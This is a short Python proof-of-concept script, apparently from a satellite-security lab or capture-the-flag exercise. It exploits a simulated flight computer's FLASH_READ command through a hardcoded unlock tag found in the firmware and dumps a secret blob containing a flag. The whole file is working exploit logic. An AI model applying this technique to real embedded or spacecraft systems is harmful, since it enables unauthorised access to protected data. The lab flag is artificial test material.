#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs

def flash_read(dev, off, ln, wid=0xA5, tag=0xC35A, via="usb"):
    return dev.tc(0x0B, struct.pack("<BHB", wid, off, ln) + struct.pack(">H", tag), via=via)

def main(dev, ev):
    # V0-09: FLASH_READ unlocks with a hardcoded tag pair (0xA5 / 0xC35A)
    # readable in the firmware image, then dumps the secret ops blob.
    tms = flash_read(dev, 0, 32, wid=0xA4)
    check(dev.err_text(tms) == "FLASH WINDOW LOCKED",
          f"wrong window id must be locked: {dev.err_text(tms)}")
    tms = flash_read(dev, 0, 32, tag=0x1234)
    check(dev.err_text(tms) == "FLASH WINDOW LOCKED", "wrong unlock tag must be locked")

    blob = b""
    for off in range(0, 128, 32):
        tms = flash_read(dev, off, 32)
        fr = dev.find(tms, 0x0B)[0]
        blob += fr.payload[4:-1]
    ev.log(f"dumped blob ({len(blob)} B):\n{blob[:80]}\n{blob[80:]}")
    check(b"FLAG=PWNSAT{flash_window_store_and_forward}" in blob,
          "secret flag must leak via hardcoded tag")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V0-09 FLASH_READ hardcoded unlock tag", main))
